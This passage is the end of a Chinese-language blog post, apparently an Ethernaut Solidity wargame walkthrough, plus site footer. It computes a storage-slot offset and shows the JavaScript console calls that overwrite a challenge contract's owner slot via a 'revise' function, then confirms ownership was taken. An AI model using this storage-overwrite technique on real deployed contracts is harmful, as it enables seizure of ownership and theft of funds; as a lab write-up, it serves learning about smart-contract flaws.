<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hex(<span class="number">2</span>**<span class="number">256</span> - <span class="number">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span>)</span><br><span class="line">             <span class="number">0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</span></span><br></pre></td></tr></table></figure>

<p>我们调用<code>revise</code>函数，并将偏移地址设置成上述地址：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.revise(<span class="string">'0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'</span>, <span class="string">'0x000000000000000000000000'</span> + player.substr(<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<p>然后我们可以确认我们已经成功获得所有权：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner() == player</span><br></pre></td></tr></table></figure>


    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by YaleXin, licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0" target="_blank" rel="noopener">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Solidity/" class="tag">#Solidity</a><a href="/tags/Web3-0/" class="tag">#Web3.0</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/31/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%8B%E7%AF%87/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">【Ethernaut闯关录】下篇</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/04/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%8A%E7%AF%87/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">【Ethernaut闯关录】上篇</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/projects" class="item">Projects</a>
                
                <a href="/resume" class="item">Resume</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a href="https://github.com/MrWillCom/rsa-cli" target="_blank" rel="noopener" class="item">RSA CLI</a>
                
                <a href="https://github.com/MrWillCom/hexo-theme-cupertino" target="_blank" rel="noopener" class="item">Hexo Theme Cupertino</a>
                
                <a href="https://github.com/MrWillCom/a-calendar" target="_blank" rel="noopener" class="item">A Calendar</a>
                
                <a href="https://github.com/MrWillCom/auto-mirroring-bucket" target="_blank" rel="noopener" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a href="https://github.com/MrWillCom" target="_blank" rel="noopener" class="item">GitHub</a>
                
                <a href="https://codepen.io/mrwillcom" target="_blank" rel="noopener" class="item">CodePen</a>
                
                <a href="https://www.patreon.com/MrWillCom" target="_blank" rel="noopener" class="item">Patreon</a>
                
                <a href="https://noc.social/@MrWillCom" target="_blank" rel="noopener" class="item">Mastodon</a>
                
                <a href="https://discord.gg/UKuFDjcfY8" target="_blank" rel="noopener" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 YaleXin<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>